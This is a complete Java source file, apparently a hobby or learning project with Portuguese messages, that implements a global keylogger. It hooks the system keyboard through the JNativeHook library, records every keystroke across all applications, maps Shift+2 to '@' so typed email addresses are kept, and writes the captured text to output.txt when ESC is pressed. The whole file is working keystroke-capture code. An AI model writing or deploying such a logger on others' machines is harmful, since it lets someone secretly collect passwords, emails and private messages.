import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class KeyLogger implements NativeKeyListener {

    private static final String OUTPUT_FILE = "output.txt"; 

    private FileWriter fileWriter;
    private PrintWriter printWriter;
    private StringBuilder keyBuffer = new StringBuilder();
    private boolean shouldTerminate = false;
    private boolean shiftPressed = false;

    public KeyLogger() {
        try {
            fileWriter = new FileWriter(OUTPUT_FILE, true);
            printWriter = new PrintWriter(fileWriter);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        
        if (keyText.equalsIgnoreCase("Shift") || keyText.equalsIgnoreCase ("Desconhecido keyCode: 0xe36")) {
            shiftPressed = true;
        }  else if (shiftPressed && keyText.equalsIgnoreCase("2")) {
        	keyBuffer.append("@");
        	
        }  else if (keyText.equalsIgnoreCase("Escape")) {
            shouldTerminate = true;
        } else if (keyText.equalsIgnoreCase("Espaço")) {            
            keyBuffer.append(" ");
        } else if (keyText.equalsIgnoreCase("Ponto Final")) {            
            keyBuffer.append(".");    
        } else if (keyText.equalsIgnoreCase("Vírgula")) {            
            keyBuffer.append(",");    
        }        
        else  {
        	keyBuffer.append(keyText);
            System.out.println("Tecla Pressionada: " + keyText);            
        }
        
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        
    }

    public void close() {
        try {
            if (printWriter != null) {
                printWriter.print(keyBuffer.toString());
                printWriter.close();
            }
            if (fileWriter != null) {
                fileWriter.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        try {
            GlobalScreen.addNativeKeyListener(keyLogger);
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Erro ao iniciar o JNativeHook: " + ex.getMessage());
            System.exit(1);
        }

       
        System.out.println("Pressione ESC para encerrar o programa...");
        while (!keyLogger.shouldTerminate) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        
        keyLogger.close();
        System.out.println("Programa encerrado.");
        System.exit(0);
    }
}